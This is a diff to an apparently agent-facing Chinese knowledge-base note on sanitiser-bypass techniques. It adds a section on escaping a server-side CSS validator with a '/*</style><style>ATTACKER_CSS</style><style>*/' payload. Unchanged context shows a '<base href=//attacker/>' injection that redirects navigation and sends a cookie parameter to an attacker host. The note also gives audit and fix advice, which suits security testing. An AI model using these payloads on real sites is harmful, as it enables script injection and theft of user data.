@@ -10,7 +10,7 @@
 - 检查实现里出现 `childElementCount`、`children`、`textContent`、`querySelectorAll(...).length`、`head.querySelector('meta[http-equiv="content-security-policy"]')` 这类结构断言；
 - 需要让一份 payload 同时满足"检查态无害"与"渲染态执行"。
 
-## 2. 六种机制
+## 2. 七种机制
 
 ### 2.1 noscript 双态解析
 
@@ -52,6 +52,16 @@
 ### 2.6 `<base>` 使属性校验与 URL 使用分离
 
 脚本校验读原始值（`getAttribute('href')` + `startsWith('/admin/')` 过检），导航用解析值——`<a>` 元素的 `href` IDL 属性取值时按 `document.baseURI` 解析成绝对 URL 字符串，而 `<base>` 元素正是改变 `document.baseURI` 的手段。注入 `<base href=//attacker/>` 后 raw href 仍是 `/admin/...` 前缀（过检），IDL 解析值却成为攻击者域绝对 URL（下游 `new URL(next.href)` 收到的是这个已被改源的绝对串）——cookie 参数随导航外带。双表征（原始属性 vs 解析 URL）消费不一致即信任边界失效，审计两处读法必须同源。
+
+### 2.7 CSS 注入边界: CSS 语法视角 vs HTML raw-text 边界
+
+用户 CSS 字符串被拼进 `<style>` 时，**`</style>` 的边界判定权在 HTML tokenizer 而非 CSS 解析器**——tokenizer 处于 raw-text 状态，不认识 CSS 注释语法，注释内的 `</style>` 照样终结元素。服务端即使做了 AST 级 CSS 校验（禁 url()/@rule/危险声明），以下形态仍整体过检为"一条注释":
+
+```css
+/*</style><style>ATTACKER_CSS</style><style>*/
+```
+
+CSS 视角是无害 comment，HTML 视角是: 注释碎片 + 新开一个 `<style>` 装 ATTACKER_CSS + 再开一个空 style 吞尾注——ATTACKER_CSS 以独立合法 stylesheet 生效。**审计**: 任何"校验后字符串直插 `<style>`"的位置都成立，校验器多严格无关; **修复**: 用户 CSS 走独立 stylesheet 资源（`<link>`/response 加 `Content-Type: text/css`）或对 `</style`（含 `<`、大小写变体）做 HTML 语境转义/拒绝。与 mXSS 的 `<style><!--` 命名空间切换（见 `$AGENT_DIR/knowledge-base/xss-advanced.md` §5）同族但方向相反——那是浏览器双遍解析差异，这是服务端校验器与浏览器 tokenizer 的职责差。
 
 ## 3. 条件式 payload 构造
 
